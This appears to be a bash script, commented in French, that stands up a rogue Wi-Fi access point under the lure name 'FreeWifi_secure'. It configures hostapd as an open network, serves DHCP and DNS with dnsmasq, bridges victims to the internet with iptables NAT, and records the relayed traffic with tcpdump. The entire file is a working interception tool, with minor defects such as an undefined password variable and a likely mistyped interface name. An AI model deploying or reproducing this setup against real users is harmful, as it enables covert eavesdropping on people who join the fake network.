#!/bin/bash


#SSID du Rogue AP
ROGUE_SSID="FreeWifi_secure"

#Plage d'adresse IP pour le DHCP
DHCP_START="10.0.0.50"
DHCP_END="10.0.0.150"

# Vérification des permissions root
if [[ $EUID -ne 0 ]]; then
        echo "Ce script doit etre lancé en root"
        exit 1
fi

# Interface Wi-fi pour le Rogue AP
WIFI_IFACE=wlp0s20f0u4
echo "[+] Interface Wi-fi trouvée : ${WIFI_IFACE}"

# Wi-fi ou Ethernet
ACTIVE_IFACE=$(nmcli -t -f DEVICE,STATE device | grep -v "disconnected" |cut -d: -f1)
type=$(nmcli -t -f DEVICE,TYPE device | grep "^$ACTIVE_IFACE" |cut -d: -f2 | head -1)
if [ "$type" = "wifi" ];then
        # Interface Internet
        INTERNET_IFACE="wlo1" 
        sudo nmcli device set $WIFI_IFACE managed no
        sudo nmcli device set $INTERNET_IFACE managed yes
elif [ "$type" = "ethernet" ];then
        echo "[+] Arret des processus bloquants"
        sudo airmon-ng check kill
        INTERNET_IFACE="enp3so"
fi
echo "[+] Interface internet trouvée : ${INTERNET_IFACE}"

echo "[+] Mise hors de tension de l'interface"
sudo ip link set $WIFI_IFACE down

echo "[+] Netoyage de l'adresse IP"
sudo ip addr flush dev $WIFI_IFACE

# Configuration de AP
echo "[+] Configuration de l'interface $WIFI_IFACE"
ip link set $WIFI_IFACE up
ip addr add 10.0.0.1/24 dev $WIFI_IFACE

# Stop le service dns
sudo systemctl stop dnsmasq

# Stop le service hostapd
sudo systemctl stop hostapd
sleep 1
# Démarre le service Hostapd
sudo systemctl start hostapd

# Fichier de configuration hostapd temporaire
HOSTAPD_CONF=$(mktemp)
cat > $HOSTAPD_CONF <<EOF
interface=$WIFI_IFACE
driver=nl80211
ssid=$ROGUE_SSID
hw_mode=g
channel=6
ieee80211w=0
wme_enabled=0
EOF
echo "[+] Configuration de dnsmasq pour le DHCP et le DNS"
DNSMASQ_CONF=$(mktemp)
cat > $DNSMASQ_CONF <<EOF
# Options de stabilité et debug
bind-interfaces
dhcp-authoritative
log-dhcp
#Interface à écouter
interface=$WIFI_IFACE
#Plage d'adresses IP et durée du bail
dhcp-range=$DHCP_START,$DHCP_END,12h
#Passerelle
dhcp-option=3,10.0.0.1
#Serveur DNS 
server=8.8.8.8
dhcp-option=6,8.8.8.8
#Ne pas lire /etc/resolv.conf
no-resolv
EOF


# Démarrage des services
echo "[+] Démarrage du serveur DHCP/DNS (dnsmasq)"
sudo dnsmasq -C $DNSMASQ_CONF
  
echo "[+] Démarrage du point d'accès (hostapd)"
hostapd $HOSTAPD_CONF &
HOSTAPD_PID=$!

#Attendre quelques secondes que hostapd soit prêt
sleep 3

#Configuration de la redirection Internet (NAT)
echo "[+] Configuration de la redirection de trafic (NAT)"
#Activer le forwarding IP dans le noyau
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf


# --- 4. Table NAT (Le "Pont" Internet) ---
# Masquerade pour sortir sur Internet
sudo iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o $INTERNET_IFACE -j MASQUERADE
sudo iptables -A FORWARD -i $WIFI_IFACE -o $INTERNET_IFACE -j ACCEPT
sudo iptables -A FORWARD -i $INTERNET_IFACE -o $WIFI_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT


echo "[+] Redirection Internet activée."


echo "==================================================================="
echo "Le Rogue AP est maintenant actif !"
echo "SSID      : $ROGUE_SSID"
echo "Mot de passe: $ROGUE_PASS"
echo "Adresse IP Gateway : 10.0.0.1"
echo "==================================================================="

#Lancement de la capture de trame avec tcpdump
sudo tcpdump -i $INTERNET_IFACE -w ma_capture.pcap

#Boucle infinie pour garder le script en vie
while true; do
    sleep 1
done
